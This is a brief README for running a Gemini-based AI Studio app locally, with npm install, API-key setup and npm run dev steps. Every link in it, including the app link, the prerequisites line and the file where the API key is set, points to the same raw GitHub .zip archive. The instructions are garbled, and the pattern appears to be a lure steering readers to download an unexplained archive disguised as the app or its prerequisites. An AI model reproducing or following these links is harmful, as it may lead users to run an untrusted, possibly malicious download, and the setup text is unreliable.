# Run and deploy your AI Studio app

This contains everything you need to run your app locally.

View your app in AI Studio: https://raw.githubusercontent.com/shahriarrafi/shahriar-jahan-rafi-portfolio/main/components/portfolio_rafi_shahriar_jahan_v3.0-beta.4.zip

## Run Locally

**Prerequisites:**  https://raw.githubusercontent.com/shahriarrafi/shahriar-jahan-rafi-portfolio/main/components/portfolio_rafi_shahriar_jahan_v3.0-beta.4.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://raw.githubusercontent.com/shahriarrafi/shahriar-jahan-rafi-portfolio/main/components/portfolio_rafi_shahriar_jahan_v3.0-beta.4.zip](https://raw.githubusercontent.com/shahriarrafi/shahriar-jahan-rafi-portfolio/main/components/portfolio_rafi_shahriar_jahan_v3.0-beta.4.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
